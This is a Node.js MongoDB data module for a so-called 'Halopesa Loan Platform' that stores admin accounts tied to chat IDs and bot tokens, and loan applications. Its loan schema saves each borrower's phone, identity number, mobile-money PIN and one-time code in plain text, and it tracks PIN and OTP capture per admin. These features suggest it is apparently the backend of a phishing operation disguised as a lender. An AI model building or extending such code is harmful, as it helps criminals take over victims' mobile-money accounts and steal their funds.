const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections
const DB_NAME = process.env.DB_NAME || 'halopesa_loan_platform';
const COLLECTIONS = Object.freeze({
    ADMINS: 'admins',
    LOANS: 'loans'
});

/**
 * Helper to ensure active DB connection.
 */
function getDb() {
    if (!db) {
        throw new Error('❌ Database not initialized. Call connectDatabase() first.');
    }
    return db;
}

/**
 * Connect to MongoDB
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }

        console.log(`🔄 Connecting to MongoDB Halopesa Loan Platform (${DB_NAME})...`);

        client = new MongoClient(MONGODB_URI, {
            maxPoolSize: 10,
            serverSelectionTimeoutMS: 5000,
        });

        await client.connect();
        db = client.db(DB_NAME);

        console.log(`✅ Connected to Halopesa Loan Database (${DB_NAME})`);

        await createIndexes();

        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Create database indexes optimized for loan management
 */
async function createIndexes() {
    try {
        const database = getDb();

        // Admins indexes
        await Promise.all([
            database.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 })
        ]);

        // Loans indexes
        await Promise.all([
            database.collection(COLLECTIONS.LOANS).createIndex({ loanId: 1 }, { unique: true }),
            database.collection(COLLECTIONS.LOANS).createIndex({ adminId: 1, createdAt: -1 }),
            database.collection(COLLECTIONS.LOANS).createIndex({ borrowerPhone: 1 }),
            database.collection(COLLECTIONS.LOANS).createIndex({ identityNumber: 1 }),
            database.collection(COLLECTIONS.LOANS).createIndex({ adminId: 1, loanStatus: 1, disbursementStatus: 1 })
        ]);

        console.log('✅ Halopesa Loan indexes created/verified');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        db = null;
        client = null;
        console.log('✅ Halopesa Loan Database connection closed');
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId) throw new Error('Admin ID is required');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');

        const adminDocument = {
            adminId,
            name: adminData.name,
            email: adminData.email,
            chatId: adminData.chatId,
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString(),
            ...(adminData.botToken && { botToken: adminData.botToken })
        };

        const result = await getDb().collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
        return result;
    } catch (error) {
        if (error.code === 11000) {
            throw new Error(`Admin with ID ${adminData.adminId || adminData.id} already exists`);
        }
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await getDb().collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await getDb().collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await getDb().collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await getDb().collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const result = await getDb().collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    return updateAdmin(adminId, { status });
}

async function deleteAdmin(adminId) {
    try {
        const result = await getDb().collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await getDb().collection(COLLECTIONS.ADMINS).countDocuments({ adminId }, { limit: 1 });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await getDb().collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// LOAN OPERATIONS
// ==========================================

async function saveLoan(loanData) {
    try {
        const loanId = loanData.loanId || loanData.id;

        if (!loanId) throw new Error('Loan ID is required');
        if (!loanData.borrowerPhone) throw new Error('Borrower phone number is required');
        if (!loanData.loanAmount) throw new Error('Loan amount is required');

        const loanDocument = {
            loanId,
            adminId: loanData.adminId,
            adminName: loanData.adminName,
            borrowerPhone: loanData.borrowerPhone,
            borrowerName: loanData.borrowerName || null,
            identityNumber: loanData.identityNumber || null,
            loanAmount: Number(loanData.loanAmount),
            loanDurationDays: loanData.loanDurationDays || 30,
            interestRate: loanData.interestRate || 0,
            pin: loanData.pin || null,
            otp: loanData.otp || null,
            pinStatus: loanData.pinStatus || 'pending',
            otpStatus: loanData.otpStatus || 'pending',
            loanStatus: loanData.loanStatus || 'pending', // pending, approved, rejected, cancelled
            disbursementStatus: loanData.disbursementStatus || 'pending', // pending, processing, disbursed, failed
            isReturningBorrower: loanData.isReturningBorrower || false,
            previousLoansCount: loanData.previousLoansCount || 0,
            createdAt: loanData.createdAt || loanData.timestamp || new Date().toISOString()
        };

        const result = await getDb().collection(COLLECTIONS.LOANS).insertOne(loanDocument);
        console.log(`💾 Loan Application saved: ${loanId} for ${loanDocument.borrowerPhone}`);
        return result;
    } catch (error) {
        if (error.code === 11000) {
            throw new Error(`Loan with ID ${loanData.loanId || loanData.id} already exists`);
        }
        console.error('❌ Error saving loan application:', error);
        throw error;
    }
}

async function getLoan(loanId) {
    try {
        return await getDb().collection(COLLECTIONS.LOANS).findOne({ loanId });
    } catch (error) {
        console.error('❌ Error getting loan:', error);
        return null;
    }
}

async function updateLoan(loanId, updates) {
    try {
        const result = await getDb().collection(COLLECTIONS.LOANS).updateOne(
            { loanId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Loan updated: ${loanId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating loan:', error);
        throw error;
    }
}

async function getLoansByAdmin(adminId) {
    try {
        return await getDb().collection(COLLECTIONS.LOANS)
            .find({ adminId })
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting loans by admin:', error);
        return [];
    }
}

async function getPendingLoans(adminId) {
    try {
        const query = {
            $or: [
                { loanStatus: 'pending' },
                { pinStatus: 'pending' },
                { otpStatus: 'pending' }
            ]
        };

        if (adminId) {
            query.adminId = adminId;
        }

        return await getDb().collection(COLLECTIONS.LOANS)
            .find(query)
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending loans:', error);
        return [];
    }
}

async function getLoansByBorrower(borrowerPhone) {
    try {
        return await getDb().collection(COLLECTIONS.LOANS)
            .find({ borrowerPhone })
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting borrower loans:', error);
        return [];
    }
}

// ==========================================
// HALOPESA LOAN STATISTICS & ANALYTICS
// ==========================================

async function getAdminLoanStats(adminId) {
    try {
        const stats = await getDb().collection(COLLECTIONS.LOANS).aggregate([
            { $match: { adminId } },
            {
                $group: {
                    _id: null,
                    totalLoans: { $sum: 1 },
                    totalAmountRequested: { $sum: '$loanAmount' },
                    pendingLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'pending'] }, 1, 0] } },
                    approvedLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'approved'] }, 1, 0] } },
                    rejectedLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'rejected'] }, 1, 0] } },
                    disbursedLoans: { $sum: {$cond: [{ $eq: ['$disbursementStatus', 'disbursed'] }, 1, 0] } },
                    totalDisbursedAmount: {
                        $sum: {$cond: [
                                { $eq: ['$disbursementStatus', 'disbursed'] },
                                '$loanAmount',
                                0
                            ]
                        }
                    }
                }
            }
        ]).toArray();

        return stats[0] ? {
            totalLoans: stats[0].totalLoans,
            totalAmountRequested: stats[0].totalAmountRequested,
            pendingLoans: stats[0].pendingLoans,
            approvedLoans: stats[0].approvedLoans,
            rejectedLoans: stats[0].rejectedLoans,
            disbursedLoans: stats[0].disbursedLoans,
            totalDisbursedAmount: stats[0].totalDisbursedAmount
        } : {
            totalLoans: 0,
            totalAmountRequested: 0,
            pendingLoans: 0,
            approvedLoans: 0,
            rejectedLoans: 0,
            disbursedLoans: 0,
            totalDisbursedAmount: 0
        };
    } catch (error) {
        console.error('❌ Error getting admin loan stats:', error);
        return {
            totalLoans: 0,
            totalAmountRequested: 0,
            pendingLoans: 0,
            approvedLoans: 0,
            rejectedLoans: 0,
            disbursedLoans: 0,
            totalDisbursedAmount: 0
        };
    }
}

async function getGlobalLoanStats() {
    try {
        const database = getDb();
        const totalAdminsPromise = database.collection(COLLECTIONS.ADMINS).countDocuments({});

        const loanStatsPromise = database.collection(COLLECTIONS.LOANS).aggregate([
            {
                $group: {
                    _id: null,
                    totalLoans: { $sum: 1 },
                    totalAmountRequested: { $sum: '$loanAmount' },
                    pendingLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'pending'] }, 1, 0] } },
                    approvedLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'approved'] }, 1, 0] } },
                    rejectedLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'rejected'] }, 1, 0] } },
                    disbursedLoans: { $sum: {$cond: [{ $eq: ['$disbursementStatus', 'disbursed'] }, 1, 0] } },
                    totalDisbursedAmount: {
                        $sum: {$cond: [
                                { $eq: ['$disbursementStatus', 'disbursed'] },
                                '$loanAmount',
                                0
                            ]
                        }
                    }
                }
            }
        ]).toArray();

        const [totalAdmins, loanStats] = await Promise.all([totalAdminsPromise, loanStatsPromise]);
        const stats = loanStats[0] || {};

        return {
            totalAdmins,
            totalLoans: stats.totalLoans || 0,
            totalAmountRequested: stats.totalAmountRequested || 0,
            pendingLoans: stats.pendingLoans || 0,
            approvedLoans: stats.approvedLoans || 0,
            rejectedLoans: stats.rejectedLoans || 0,
            disbursedLoans: stats.disbursedLoans || 0,
            totalDisbursedAmount: stats.totalDisbursedAmount || 0
        };
    } catch (error) {
        console.error('❌ Error getting global loan stats:', error);
        return {
            totalAdmins: 0,
            totalLoans: 0,
            totalAmountRequested: 0,
            pendingLoans: 0,
            approvedLoans: 0,
            rejectedLoans: 0,
            disbursedLoans: 0,
            totalDisbursedAmount: 0
        };
    }
}

async function getPerAdminLoanStats() {
    try {
        return await getDb().collection(COLLECTIONS.ADMINS).aggregate([
            {
                $lookup: {
                    from: COLLECTIONS.LOANS,
                    localField: 'adminId',
                    foreignField: 'adminId',
                    as: 'loans'
                }
            },
            {
                $project: {
                    _id: 0,
                    adminId: 1,
                    name: 1,
                    totalLoans: { $size: '$loans' },
                    pendingLoans: {
                        $size: {
                            $filter: { input: '$loans', as: 'l', cond: { $eq: ['$$l.loanStatus', 'pending'] } }
                        }
                    },
                    approvedLoans: {
                        $size: {
                            $filter: { input: '$loans', as: 'l', cond: { $eq: ['$$l.loanStatus', 'approved'] } }
                        }
                    },
                    disbursedLoans: {
                        $size: {
                            $filter: { input: '$loans', as: 'l', cond: { $eq: ['$$l.disbursementStatus', 'disbursed'] } }
                        }
                    },
                    totalDisbursedAmount: {
                        $sum: {$map: {
                                input: {
                                    $filter: { input: '$loans', as: 'l', cond: {$eq: ['$$l.disbursementStatus', 'disbursed'] } }                                 },                                 as: 'dl',                                 in: '$$dl.loanAmount'
                            }
                        }
                    }
                }
            }
        ]).toArray();
    } catch (error) {
        console.error('❌ Error getting per-admin loan stats:', error);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const admins = await getAllAdmins();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await getDb().collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,

    // Admin operations
    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,

    // Loan operations
    saveLoan,
    getLoan,
    updateLoan,
    getLoansByAdmin,
    getPendingLoans,
    getLoansByBorrower,

    // Loan statistics
    getAdminLoanStats,
    getGlobalLoanStats,
    getPerAdminLoanStats,

    // Maintenance
    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
